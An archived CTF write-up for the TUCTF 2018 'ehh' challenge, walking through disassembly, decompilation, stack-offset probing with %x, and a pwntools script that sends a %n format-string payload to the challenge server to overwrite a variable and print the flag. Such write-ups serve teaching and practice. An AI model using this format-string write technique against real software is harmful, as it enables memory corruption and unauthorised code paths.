# ehh

**CTF:** TU 2018  
**Category:** misc  
**Original writeup:** <https://cexplr.home.blog/2018/11/26/ehh-tuctf-2018/> — by **cexplr.home.blog**. All credit goes to the original author; this is an archived copy.

---

Difficulty: easyWhatever… I dunno

nc 18.222.213.102 12345





Test Run

First, let’s run the program locally.

root@kali:~/Desktop/tuctf/ehh-398# ./ehh >Input interesting text here< 0x565d6028 asfasf asfasf Vroot@kali:~/Desktop/tuctf/ehh-398# ./ehh >Input interesting text here< 0x56625028 fsf fsf {7bVroot@kali:~/Desktop/tuctf/ehh-398# ./ehh >Input interesting text here< 0x5659b028 sdfsdf sdfsdf Vroot@kali:~/Desktop/tuctf/ehh-398#

We can see that there are some hex digits printed out and some gibberish being echoed back. In order to determine what happen, let’s disassemble it.

gdb-peda$ disassemble main Dump of assembler code for function main: 0x00000670 <+0>: lea ecx,[esp+0x4] 0x00000674 <+4>: and esp,0xfffffff0 0x00000677 <+7>: push DWORD PTR [ecx-0x4] 0x0000067a <+10>: push ebp 0x0000067b <+11>: mov ebp,esp 0x0000067d <+13>: push ebx 0x0000067e <+14>: push ecx 0x0000067f <+15>: sub esp,0x20 0x00000682 <+18>: call 0x540 <__x86.get_pc_thunk.bx> 0x00000687 <+23>: add ebx,0x1979 0x0000068d <+29>: mov eax,DWORD PTR [ebx-0x10] 0x00000693 <+35>: mov eax,DWORD PTR [eax] 0x00000695 <+37>: push 0x14 0x00000697 <+39>: push 0x2 0x00000699 <+41>: push 0x0 0x0000069b <+43>: push eax 0x0000069c <+44>: call 0x4e0 <setvbuf@plt> 0x000006a1 <+49>: add esp,0x10 0x000006a4 <+52>: mov eax,DWORD PTR [ebx-0x14] 0x000006aa <+58>: mov eax,DWORD PTR [eax] 0x000006ac <+60>: push 0x14 0x000006ae <+62>: push 0x2 0x000006b0 <+64>: push 0x0 0x000006b2 <+66>: push eax 0x000006b3 <+67>: call 0x4e0 <setvbuf@plt> 0x000006b8 <+72>: add esp,0x10 0x000006bb <+75>: sub esp,0x8 0x000006be <+78>: lea eax,[ebx+0x28] 0x000006c4 <+84>: push eax 0x000006c5 <+85>: lea eax,[ebx-0x1850] 0x000006cb <+91>: push eax 0x000006cc <+92>: call 0x4b0 <printf@plt> 0x000006d1 <+97>: add esp,0x10 0x000006d4 <+100>: sub esp,0x4 0x000006d7 <+103>: push 0x18 0x000006d9 <+105>: lea eax,[ebp-0x20] 0x000006dc <+108>: push eax 0x000006dd <+109>: push 0x0 0x000006df <+111>: call 0x4a0 <read@plt> 0x000006e4 <+116>: add esp,0x10 0x000006e7 <+119>: sub esp,0xc 0x000006ea <+122>: lea eax,[ebp-0x20] 0x000006ed <+125>: push eax 0x000006ee <+126>: call 0x4b0 <printf@plt> 0x000006f3 <+131>: add esp,0x10 0x000006f6 <+134>: mov eax,DWORD PTR [ebx+0x28] 0x000006fc <+140>: cmp eax,0x18 0x000006ff <+143>: jne 0x713 <main+163> 0x00000701 <+145>: sub esp,0xc 0x00000704 <+148>: lea eax,[ebx-0x182e] 0x0000070a <+154>: push eax 0x0000070b <+155>: call 0x4c0 <system@plt> 0x00000710 <+160>: add esp,0x10 0x00000713 <+163>: mov eax,0x0 0x00000718 <+168>: lea esp,[ebp-0x8] 0x0000071b <+171>: pop ecx 0x0000071c <+172>: pop ebx 0x0000071d <+173>: pop ebp 0x0000071e <+174>: lea esp,[ecx-0x4] 0x00000721 <+177>: ret End of assembler dump.

Due to the amount of time I can spend on a challenge before failing my exams, I quickly decompile it.

int __cdecl main(int argc, const char **argv, const char **envp) { char buf; // [esp+0h] [ebp-20h] int *v5; // [esp+18h] [ebp-8h] v5 = &argc; setvbuf(stdout, 0, 2, 0x14u); setvbuf(stdin, 0, 2, 0x14u); printf(">Input interesting text here< %p

", &val); read(0, &buf, 0x18u); printf(&buf); if ( val == 24 ) system("/bin/cat ./flag"); return 0; }

We can therefore see that it is most likely a format string attack since there is a `printf(&buf);` after reading user input.

To test it out,

root@kali:~/Desktop/tuctf/ehh-398# ./ehh >Input interesting text here< 0x565fe028 AAAA %x %x %x %x %x %x %x %x %x AAAA ffcbf1e8 18 0 f7eea3fc 565fe000 41414141 % ���root@kali:~/Desktop/tuctf/ehh-398# x %x %x bash: x: command not found root@kali:~/Desktop/tuctf/ehh-398#

Now, AAAA is stored as hex ini the 6th position. We can confirm that with `%6$x`.

root@kali:~/Desktop/tuctf/ehh-398# ./ehh >Input interesting text here< 0x5656a028 AAAA %6$x AAAA 41414141

The aim for this program to print the flag is to make sure the variable val is 24. It is currently a non 24 number. Before proceeding, we need to find out the address of val so we can write into that memory. Also, this program is not stripped meaning we can most likely find the address by typing `p &val`.

Breakpoint 1, 0x5655567f in main () gdb-peda$ p &val $3 = (<data variable, no debug info> *) 0x56557028 <val>

It is `0x56557028`. Also we need to store int 24 and we will use the %n format to write it into the address.

In the payload, we add the target address followed by 24 bytes written followed by %n format. Since we are targetting the 6th position, our payload can look something like this.

payload = "" payload += target payload += "AAAABBBB" payload += "%6$12x" payload += "%6$n"

For this challenge, the target address is always changing since ASLR is enabled on the server as well. However, the good news is that the target’s address is printed out `>Input interesting text here< 0x565ec028`.

So we can write a script to get that value and setup our payload then submit it to get the flag.

The Script

from pwn import * #p = process("./ehh") #raw_input() p = remote("18.222.213.102",12345) target = p.recvrepeat(0.4) print target target = target.split("<")[1][:-1].lstrip().rstrip() target = p32(int(target,16)) payload = "" payload += target payload += "AAAABBBB" payload += "%6$12x" payload += "%6$n" print("Payload : '" + payload +"'") p.sendline(payload) k = p.recvrepeat(0.5) print k p.close()

And the result is

Flag : TUCTF{pr1n7f_15_pr377y_c00l_huh}
